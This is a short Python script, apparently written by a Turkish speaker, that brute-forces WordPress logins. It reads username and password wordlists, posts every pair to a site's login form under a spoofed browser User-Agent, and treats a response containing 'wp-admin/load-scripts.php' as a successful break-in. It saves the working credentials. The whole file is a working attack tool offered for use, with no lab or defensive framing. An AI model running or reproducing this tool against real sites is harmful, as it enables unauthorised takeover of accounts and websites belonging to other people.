#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat Oct 13 15:47:25 2018

@author: mehmtee
"""


import requests

import time

time.sleep(2)

class Brute:
    
    basarili_giris = []
    denemesayisi = 0
    hed = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}

    def __init__(self,usr_txt,pass_txt,url,headers=hed):
        
        self.usr_txt = usr_txt
        self.pass_txt = pass_txt
        self.url = url 
        self.user_txt_readlines = open(self.usr_txt,'r').readlines()
        self.pass_text_readlines = open(self.pass_txt,'r').readlines()
        self.headers = headers
        
    def Start(self):
        for i in self.user_txt_readlines:
            for y in self.pass_text_readlines:
                self.http = requests.post(self.url,data={'log':i,'pwd':y,'wp-submit':'submit'},headers=self.headers)
                self.content = self.http.content
                if ('wp-admin/load-scripts.php').encode() in self.content:
                    
                    print("Başarılı")
                    print(" ")
                    self.basarili_giris.append("Kullanıcı adı : {}".format(i))
                    self.basarili_giris.append("Şifre : {}".format(y))
                    
                    self.u_name = i
                    self.p_name = y
                    
                    
                    return
                else:
                    print("Başarısız [-]")
                    print("["+str(self.denemesayisi)    +"]")
                    self.denemesayisi = self.denemesayisi+1
                    
    def headers_Re(self,new):
        self.headers = new
        
        

    




